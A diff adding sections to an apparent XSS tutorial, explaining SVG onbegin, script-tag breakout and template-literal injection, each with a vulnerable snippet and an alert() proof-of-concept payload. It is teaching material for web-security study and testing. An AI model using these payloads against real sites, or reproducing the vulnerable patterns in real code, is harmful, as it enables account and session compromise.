@@ -286,3 +286,54 @@ If you need to work with ```iframes```, for example, in order to be able to trig
 
 In order to automate the execution of the alert we can use the "onfocus event". If we assign an ID to our custom element, we can recall it by passing the hash to the URL QUERY. The problem is that an element recalled by the hashchange is not automatically "on focus". So if we set the "tabindex" parameter to 1, this element will be focused for first. If the user, then, click the tab on the keyboard will navigate other element of the page.
 
+# XSS in SVG tag using ```<animateTransform>``` and "onbegin" event
+
+```html
+<svg><animateTransform onbegin='alert(1)'>
+```
+
+
+# XSS in reflected JS script tag with escaping of "\" and "'"
+
+In this scenario we have our input reflected in a ```<script> tag```. If we try to insert the chars ```'``` or ```\``` we notice that these will be escaped.
+
+However, we are inside a ```<script>``` tag so we can try to close this tag and open a new ```<script>``` tag to execute our JS code.
+
+Scenario:
+
+```html
+<script>
+    var searchTerms = 'test';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+We can bypass the escaping by passing the following:
+
+```html
+</script><script>alert("xss")</script>
+```
+
+In some cases this will break the script tag and will be interpreted as a new script.
+
+# JavaScript template string injection
+
+Scenario:
+```html
+<script>
+    var message = `0 search results for 'test'`;
+    document.getElementById('searchMessage').innerText = message;
+</script>
+```
+
+In this case we can see that our 'test' passed string is reflected inside a JS and in particular inside a **backtick `**. In JS a literal inside a backtick isn't a regular string like one inside ' or ". This is called a template string or **string literal**.
+
+In this situation, if we write ```${myVar}``` inside the string literal it will be replaced with the value of the var "myVar" and concatenated with the remaining part of the string literal.
+
+In this case if we pass this:
+
+```js
+${alert(1)}
+```
+
+It will be executed as a regular JS and will result in a XSS.
